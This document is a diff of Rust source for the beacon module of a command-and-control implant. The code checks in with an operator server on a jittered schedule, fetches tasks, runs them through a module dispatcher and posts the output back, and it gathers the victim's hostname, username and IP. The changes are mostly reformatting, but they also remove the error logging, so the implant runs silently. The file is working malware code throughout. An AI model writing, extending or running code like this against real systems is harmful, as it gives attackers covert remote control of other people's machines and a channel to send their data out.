@@ -8,9 +8,6 @@ use std::time::Duration;
 use crate::config::ImplantConfig;
 use crate::modules;
 
-// ── Wire types ───────────────────────────────────────────────────────────────
-// These must match the server's JSON schemas exactly.
-
 #[derive(Serialize)]
 struct Checkin {
     session_id:  Option<String>,
@@ -25,26 +22,24 @@ struct Checkin {
 #[derive(Deserialize)]
 struct CheckinResponse {
     session_id: String,
-    tasks: Vec<Task>,
+    tasks:      Vec<Task>,
 }
 
 #[derive(Deserialize)]
 struct Task {
     task_id: String,
-    module: String,
-    args: Vec<String>,
+    module:  String,
+    args:    Vec<String>,
 }
 
 #[derive(Serialize)]
 struct TaskResult {
     session_id: String,
-    task_id: String,
-    module: String,
-    success: bool,
-    output: serde_json::Value,
+    task_id:    String,
+    module:     String,
+    success:    bool,
+    output:     serde_json::Value,
 }
-
-// ── Beacon loop ──────────────────────────────────────────────────────────────
 
 pub async fn run(config: ImplantConfig) -> Result<()> {
     let client = build_client(&config)?;
@@ -58,14 +53,13 @@ pub async fn run(config: ImplantConfig) -> Result<()> {
                 session_id = Some(resp.session_id.clone());
                 for task in resp.tasks {
                     let (success, output) = modules::dispatch(&task.module, &task.args);
-                    if let Err(err) = send_result(&client, &config, &resp.session_id, &task.task_id, &task.module, success, output).await {
-                        eprintln!("[beacon] result post failed for {}: {err}", task.task_id);
-                    }
+                    let _ = send_result(
+                        &client, &config, &resp.session_id,
+                        &task.task_id, &task.module, success, output,
+                    ).await;
                 }
             }
-            Err(err) => {
-                eprintln!("[beacon] checkin failed: {err}");
-            }
+            Err(_) => {}
         }
 
         tokio::time::sleep(Duration::from_millis(sleep_ms)).await;
@@ -73,8 +67,8 @@ pub async fn run(config: ImplantConfig) -> Result<()> {
 }
 
 async fn do_checkin(
-    client: &reqwest::Client,
-    config: &ImplantConfig,
+    client:     &reqwest::Client,
+    config:     &ImplantConfig,
     session_id: &Option<String>,
 ) -> Result<CheckinResponse> {
     let body = Checkin {
@@ -102,18 +96,18 @@ async fn do_checkin(
 }
 
 async fn send_result(
-    client: &reqwest::Client,
-    config: &ImplantConfig,
+    client:     &reqwest::Client,
+    config:     &ImplantConfig,
     session_id: &str,
-    task_id: &str,
-    module: &str,
-    success: bool,
-    output: serde_json::Value,
+    task_id:    &str,
+    module:     &str,
+    success:    bool,
+    output:     serde_json::Value,
 ) -> Result<()> {
     let body = TaskResult {
         session_id: session_id.to_owned(),
-        task_id: task_id.to_owned(),
-        module: module.to_owned(),
+        task_id:    task_id.to_owned(),
+        module:     module.to_owned(),
         success,
         output,
     };
@@ -129,8 +123,6 @@ async fn send_result(
         .context("server rejected result")?;
     Ok(())
 }
-
-// ── Helpers ──────────────────────────────────────────────────────────────────
 
 fn build_client(config: &ImplantConfig) -> Result<reqwest::Client> {
     let mut builder = reqwest::Client::builder().timeout(Duration::from_secs(30));
@@ -154,10 +146,7 @@ fn build_headers(extra: &HashMap<String, String>, user_agent: &str) -> HeaderMap
 }
 
 fn jittered_sleep(base_ms: u64, jitter_pct: u64) -> u64 {
-    if jitter_pct == 0 {
-        return base_ms;
-    }
-    // Simple pseudo-random jitter using process id + monotonic time
+    if jitter_pct == 0 { return base_ms; }
     let seed = (std::process::id() as u64).wrapping_add(
         std::time::SystemTime::UNIX_EPOCH
             .elapsed()
@@ -165,8 +154,7 @@ fn jittered_sleep(base_ms: u64, jitter_pct: u64) -> u64 {
             .unwrap_or(0),
     );
     let spread = (base_ms * jitter_pct) / 100;
-    let offset = seed % (spread * 2 + 1);
-    base_ms.saturating_add(offset).saturating_sub(spread)
+    base_ms.saturating_add(seed % (spread * 2 + 1)).saturating_sub(spread)
 }
 
 fn hostname() -> String {
@@ -183,11 +171,7 @@ fn username() -> String {
 
 fn local_ip() -> String {
     std::net::UdpSocket::bind("0.0.0.0:0")
-        .and_then(|s| {
-            s.connect("8.8.8.8:80")?;
-            s.local_addr()
-        })
+        .and_then(|s| { s.connect("8.8.8.8:80")?; s.local_addr() })
         .map(|addr| addr.ip().to_string())
         .unwrap_or_else(|_| "unknown".to_owned())
 }
-
